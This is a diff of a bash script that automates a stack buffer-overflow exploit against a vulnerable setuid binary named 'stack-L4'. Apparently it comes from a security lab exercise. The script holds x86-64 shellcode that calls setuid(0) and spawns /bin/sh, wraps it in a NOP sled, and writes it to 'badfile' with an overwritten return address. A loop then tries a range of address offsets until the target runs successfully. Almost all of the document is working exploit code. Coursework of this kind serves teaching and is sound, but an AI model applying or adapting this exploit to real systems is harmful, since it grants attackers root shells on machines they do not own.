@@ -1,16 +1,14 @@
 #!/bin/bash
 
-echo "Trying different offsets for Level 4..."
+echo "Trying different offsets from str address..."
 
-for off in 180 184 188 192 196 200 204 208 212 216 220 224 228 232 236 240
+for off in 0 20 40 60 80 100 120 140 160 180 200
 do
     echo "======================================"
-    echo "Trying offset: $off"
+    echo "Trying str + $off"
     
     cat > exploit-L4.py << EOF
 #!/usr/bin/python3
-import sys
-
 shellcode = (
     "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
     "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
@@ -19,28 +17,24 @@ shellcode = (
 ).encode('latin-1')
 
 content = bytearray(0x90 for i in range(517))
+content[0:len(shellcode)] = shellcode
 
-start = 100
-content[start:start + len(shellcode)] = shellcode
+str_addr = 0x7fffffffd938
+ret = str_addr + $off
 
-buffer_addr = 0x7fffffffd946
-ret = buffer_addr + $off
-
-offset = 18
-L = 8
-content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')
+content[18:26] = (ret).to_bytes(8, byteorder='little')
 
 with open('badfile', 'wb') as f:
     f.write(content)
+
+print(f"Return address: 0x{ret:016x}")
 EOF
     
     python3 exploit-L4.py
     timeout 2 ./stack-L4
     
-    if [ $? -eq 0 ]; then
-        echo "SUCCESS at offset $off!"
+    if [ \$? -eq 0 ]; then
+        echo "SUCCESS at str + $off!"
         break
     fi
-    
-    sleep 0.1
 done
